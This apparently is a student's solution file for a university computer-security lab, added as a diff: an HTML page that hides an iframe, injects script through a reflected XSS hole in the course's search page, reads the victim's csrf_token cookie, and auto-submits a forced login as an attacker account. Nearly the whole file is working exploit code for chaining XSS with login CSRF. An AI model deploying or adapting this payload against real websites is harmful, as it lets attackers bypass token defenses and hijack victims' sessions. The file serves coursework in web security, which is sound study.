@@ -1,0 +1,54 @@
+<!DOCTYPE HTML>
+<!--  Project 2 2.1 Token validation -->
+<!--  Simiar to 2.0 Use javascript to submit a form.
+      Difference: need to crawl for the random 16-byte value
+      embedded in the page. Submit that together with the form.
+-->
+<head>
+  <meta charset="UTF-8">
+  <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+</head>
+
+<body>
+  <!-- reference:http://www.coderanch.com/t/419926/HTML-CSS-JavaScript/hidden-iframe -->
+  <iframe id="hidden_iframe" name="hidden_iframe"></iframe>
+
+<script>
+  // targeted address
+  var addr = "http://eecs388.org/project2/search?xssdefense=0&csrfdefense=1&q=" ;
+  // create a hidden iframe doesn't really matter if it's really hidden or not;
+  var iframe =    "<iframe name='hidden_iframe'></iframe>";
+  // create a form with csrf_token 
+  var form =      "<form name='hidden_form' method='POST' action='http://eecs388.org/project2/login'>" +
+                  "<input type='hidden' name='username' value='attacker'>" +
+                  "<input type='hidden' name='password' value='l33th4x'>" +
+                  "<input type='hidden' name='csrfdefense' value='1'>" +
+                  "<input type='hidden' name='xssdefense' value='0'>" +
+                  "<input type='text' name='csrf_token'>" +
+                  "</form>";
+  // get cookie parameter 
+  // reference: http://www.the-art-of-web.com/javascript/getcookie/
+  var getCookie = "<script>function getCookie(name){ " +
+                  "var re = new RegExp(name + \"=([^;]+)\"); " + 
+                  "var value = re.exec(document.cookie); " +
+                  "return (value != null) ? unescape(value[1]):null;" +
+                  "}";
+  // 
+  var q = "$(\"input[name='csrf_token']\").val(getCookie('csrf_token'));" +
+          "document.hidden_form.submit()</script" + ">";
+
+  // alert( addr + iframe + form);
+  var query = iframe + form + getCookie + q ;
+  // convert to URIComponent allow for special char to be interpreted
+  var src = addr + encodeURIComponent(query);
+
+  // alert(src);
+  // add source attribute to the hidden_iframe #jQuery
+  $("#hidden_iframe").attr("src" , src);
+
+  document.getElementById("hidden_iframe").style.display="none";
+  document.getElementById("hidden_iframe").style.visibility="hidden";
+  
+  // document.form.submit();
+</script>
+</body>
